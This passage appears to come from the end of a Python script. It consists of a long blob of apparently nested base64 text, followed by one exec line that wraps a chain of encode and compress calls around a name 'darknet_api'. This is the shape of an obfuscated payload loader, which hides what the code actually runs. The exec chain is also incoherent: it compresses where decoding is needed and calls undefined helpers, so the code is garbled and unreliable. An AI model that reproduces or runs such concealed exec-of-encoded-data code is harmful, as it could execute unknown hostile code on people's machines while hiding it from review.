sbHJaRmRpUjA1RVlVaENhV0pzUm5aYVJXUnpaRVp3V1ZOdFNrNVNha0ozVXpGR2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1NWUnVUbUZXTVZvelV6QlNUbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsSXhXbnBaVm1SYVdqSk5lVTlVUm1wUmVsWjBXVlpqTVdFd2RFUmFSM1JvVjBac2RWUkZaSE5oTVVKVVdrYzVZVll3V25KWFZ6RkhaVlZ3TldFeVpHaFhSVEZ1V1cwd05VMUZiRVpPV0ZwcFlsWlZNbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVwMFdXcE9TbG94Y0VoU2FrSmFWVEJLZDFsdGJFTmxiVWw2Vm01a1RXSldjSGRaYlRGVFdteHNXR1ZJVGt4Uk1sSnlXVlpvV21KcmVFaFViazVhVjBVMU5sZEliM2RpYkd0NVQxaFdhMUl3V25kWmJURlhaVlY0V0ZkdVRtdFdNbmh5VTI1c2NrNXJUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRnBOYW14eVYyeE9RazlWYkVoVmJXaHJVakJXTVZkcVNsZE5SWFJFV2tkMFdsZEdTbTlVUm1SUFpHeHdTRlpYTlV4VlZ6bHVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZXaFRZMGRLV0ZadWJFcFNSRUp1VjJ0a1IwMUdiRlJPVnpWaFYwWkdkbE5xU2xOaFIxSklVbGhTYTFJeWVEQlhiR2hLWW10MFVtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsTkdTakpaVkVwWFpGVnNSVTFIWkdGU01GbDNWMVpOTVdKc2NGbFZWemxMVFd4S2IxcEZaRVprUjFKSVQxaEtZVlo2VW5WVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEpWRzVPWVZZeFdqTlRNR1J6WkZkU1JHRkVRbWhXZWtaeldUSnNjbU5GVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkdwaFZVVTFVMVZrVG1SWFRraFBXSEJyVVRKa2RWbFZhRk5OUjA1SlZGUmFUV1ZVYkhKWmFrcHJZa1pyZVdWSVFscE5iazR4VjFSSk5XUkZkM3BUYlhoclRXdGFOVmRyVG1wak1YQklVbXBDV2xaRVJUTlRha3BQWkd4d1NGWlhOVkJoVlVweFdXcEtVMkpGZUVSUlZ6VnJVbnBzZVZkc1l6Qmlhemx3VVdwQ2FVMXVVbk5aYlRSM1l6SkdTRlp0YUdGU01WbzFXVE52ZUUxV2JGUmhNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRW93VjJ4b1QyVnNiRmhhUjNoWlRXMW9kMWw2VGxOa2JVNTFZVEprVVZVd1NuRlphMlJ6WWtkS2RWVlhPVk5OYkZsM1ZUQmtjMlZ0VWtoUFdHeHNWbXR3YzFreGFGZGlSMDE2VlZjNWFsSXhXbk5aTW05NFlXMUdTRkp1Vm1saVZscDZWMFJLVjJSWFVraGlSRUpzVlROb2VsbFdZM2hqUjFKRlRVaG9UVko2YkhSWGJUVlBZa2RTUjA5WGRGcFhSa3B6VlVaVk1XUnRTblJXV0U1cFRXeHdkRmw2U2xkTlJtZDVZa2QwVVZaRlJucFpiR1JIVGtabmVXSkhkRkZXUlVaNldXeGtjMlJXWjNsaVIzUlJWa1ZHZWxkV1pGTmhNV2Q1VDFjeFlXSnJOWE5hUlZGM1pEQjRTR0ZIYUdwTmJXTTFWRlZPY21ORlRuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpHbFdNVm8yV1hwS1IySnNjRlJSVkd4S1VucEdjMWw2VGs5aFJtOTVWbTFhYUZJeWVEWmFSV00xWlZkV1ZFNVlVbUZYUlRVMlYxWmthMkpIVFhoak0yUlpWWHBXTUZkc2FFOWxiR3hZV2tkNFJHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2Jsa3dhRXRqUjBwMVZWYzVTbUpJWnpCVVZtUkxXV3N4UldNemNFNVNTRTEzVkZSSmVGbHJkSE5OUjJSV1RURmFjVmRVU2xkbGJIQjFWbTVPU2xKVk5YcFhWbVJ6WkVWc1JFMUhaRXBoVlVaNVUxVm9UMDFIVG5CaFIyeHBUVEZLYlZkVVNtOWhSMHAwVGxkNGFWRXlkSGRSTW14Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFaFdiazVxVFd4Vk1sRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRW96V1RJeGMyUlhVa1JhTWpWWlUwZGtORmRYZUhwbGF6azJWRmhvVUdWc1JqTlpiRnA2WTFab1ZGRnJVbHBYUlVsM1YxUktiMkZGYkVoVmJYaHJVakZhY1ZwRlpGZGhNR3hFVFVka1MyVlZSbmxUVldoUFRVZE9jR0ZIYkdsTk1VcHRWMVJLYjJGSFNuUk9WM2hwVVRKMGQxRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRW8yV1d0a1YySkhUa1JhTTJ4TVZWYzVibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRnBOYm1oM1YyeGpNVTFGZEVaYVIzaHJVbFZ3TWxwRlZrOWhSMHBJWlVkc1dsWXdOWGxWVm1NeFpXMVJlVlp1YkZaaVZsbzBXa1prVjJWdFVrUmhSM0JvVWpCYU1WbHRNVmRqTVdkNlZtNXdZVmRGY0RGWFZtTjRZa1Y0U0ZSdE9WcFdlbFl4VjJ4a05GcHRSbGhWV0U1aFVqQlpkMWRXVVhoa1JuQlpWRzV3V2xZeVVuTlhSRXB2WTBkTmVsVnVXbXBpYlhReFdXeGtWMlZ0VFhsU2JUVmhWMFUxYVZSVldYZGtWMDUwVm01a2FWTkhlRzFaYkdSSFpWZEZlbFp1WkUxaWEzQXlXa1JPVDFsck1WZE5TRlphWW14WmQxcEZZelZrVjAxNFl6Tm9XVlY2Vm5KWFZtaFRZVVYwVkdFd2RFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEpVVzVzYUZaNlZYZFRWVTV1WW14b1NWb3phRnBpU0U0MlZETndUbVZGT1RaVldHUnBWbTVPZUZkR1RrTldSMFY1WWtoa1NsSlZOVzlaTUdoVFlXMUdTRkpYWkUxVk1FWjFVMVZPZWxveVRYcFZibXhNVWpCd01scEZXVFZoYlVaSVVtNVdhV0pXV25wVE1VNHpXakZ3V0U1WGRGRlZNSEJxV1RKc1NtTkZUbkJSVjJSS1VUQktjMXBWWkU5aVIwNUpWVlJhUkdGVlJtNVRWVTVDV2pCc1JGRlhaR3BUUlhCM1dXMDFVbUl3YkhKV2JteHFZbFJzTlZOVlZsTmlSMUpJVm0xd2ExSXhXbkpUVlUxM1dqQnNjRkZZU2twVFJUUjNXVEpzYjJGWFNYcFZiVnBhVFcxb2IxbHRNREZpUjBwRVlUTkNSR0ZWUm01VFZVNUNXakJzUkZGWFpHcE5NbmcyVkVjeFYwNUhSbGxWVnpsTVZWYzVURnBFU205alIwcElWbGRrVjFORmIzaFhiRkoyVXpCT1dWRllhRXBTUkVKdVdXeG9WMk15VWtoaVNHUnFZbFJzY1Zkc2FFOWxiVVpZVGxjMVRXSkZTalZaYWtwUFlrZE5lbFJYT1d0U01GbzFWMnBLVjAxR1FsaFViazVhVmpKNE1GUkZaRWRsVm05NlZGUnNXR1ZYVWtKVmEyTTFZbXh3V0ZSdVdtaFdlbFp0VjFSS05HTkdhM2xrUjFwYVlsUnJkMU5xUlhkalJVNXVZa2hrVG1GVlJUVlRWV040VFZkS1NWVnVRbXBUUlhBeVYxUktWMlZ0VFhsaVNGWmhaVlJXVWxreU1EVmhiSEJaVkc1d1RGTkdTbTlaTWpGcllrZFNSVTFYY0dsU01GcDNXV3hPTkdGSFRuUmFTSEJSVm01T2RWVlZWa3RTUms1SFQxZHdhVkl5ZUhGWlZFcExaRzFTUkZwSFVreFZWemxMV1RCU1Rsb3hRbFJSYmxKclZqTm5kMWxXYUVObFYwbDVWRzE0YWswd05YZFpiVEZxWkZaV1NWTnVXbHBOYkZvMldUTnNiMDFHYkZsVGJUVmhWMFpGTlZkVVNqUmhSMFpZVFVoT1dsZEZjSFZaTTI5NFdXdHZkMUZ0UmxwTmExbzJXVlZaTldGdFNraGlSM0JvVFZSc2NGbHFUbEppYkdoVVlUQjBSRmRGUlhkVFZWRjNXakpLV1ZadVRtdFNNbmd6V1RJd05XRnNjRmxVYm5Cb1ZucFdkVlJIZUVObFYwbDVWRzE0YWswd01YWmFSV1JIWlZadmVWWnFRbEZXTURWNlYxWmtjMlJGZUVoU2JteGhUVEF3TlZZemJHdFJWbEpJWWtSQ1lWWXdOVEpaVm1NeFdteHJlV1ZJUWxwTmJsSnRWMWN3TlUxRmIzaE5TRUpFV2pKNE0xUnNUa0pQVld4SVRWUkdhVk5HU25kWk1HaExaR3hyZVZadWNHcE5iWGd4VjI1ck1WVlhUblJQVjNCaFYwVTFObE13YUZOaFIwNTBXa2Q0YTFKRVJuRlphMlJIWTBkS1ZHVkhhR3BpVjFJMlZVWmFlbUpzUmtaVGJrSnJVakExTWxsV1l6RlNSMHBJWWtkd2FFMVViSEJaYWs1U1lteG9WR0V3ZEVSYU1uZ3pWRlpOTVdWdFVraFNibXhyVVRKa2QxRXlaSE5rTURGd1RsaHdhMUl3V2pWYVJVNXVZMFZPYm1KSVpFNWxWRlkyV2tWa1IyVlhVa1JhTTBKRVdqSjRNMVJyVFRGbGJWSklVbTVzYTFFeVpIZFJNbVJ6WkRBMVZFNVljR3RTTUZvMVdrVk9ibU5GVG01aU1IQnFUVzVvYzFkc2FFSmlNREZVWVRCMFJGb3llRE5VVmsweFkxZEplV0pJVmt4Uk1uUk1VVEZvUW1WVmVIUmpTRnBvVm5wU2RsTXhSblpUYlU1RlZGaFdhR0pVYkhkWmJXeHVZMFZPYm1KSVpFOVJlbFo0V1dwS2MyUlZkRVJoTUhSRVYwVkZlRlJITVhka2JVWllUa2M1VEZWWE9VeFJNVnBEWlZkR1dFNVVRa3hSTUhCcFV6SjNkMW94VW5SV2FsSnJVVEJLUlZsclpFZGpSMHBVVVd0S1lXSnNTbk5aTW14Q1pVVnNSbUZJV210WFJXeHVWRWRzUW1SVmJFUk9SMnhNVlZjNVRGRXhaR0ZrYlU1d1VXNUNTbEl5ZURGVFZXaExZVWRLZEZwSGVFeFNSVEI1VkZWU1FtTkZPVzVpTUhCRVYwVktOVmxXWXpGTlJYUklZVEprVEdWVlJuQlVTSEJPVFdzeFJWRlhaR3BOYkZweFdXcEpNV0V5VGpWUmFrWnBZbXhLZDFsclRrTmtWbkJaWVVSQ1NsSXdOWHBYVm1SelpFVnNjR1ZIZUdsaVZrVTFVMWQ0TkdWVmJIQmhNSFJFVlZkNE5sbHJaRmRpUjA1RVdqTm9URlZVTURrPQ==";exec(marshal_encode(zlib_compress(obfuscate_import(zlib_compress(obfuscate_import(darknet_api))))))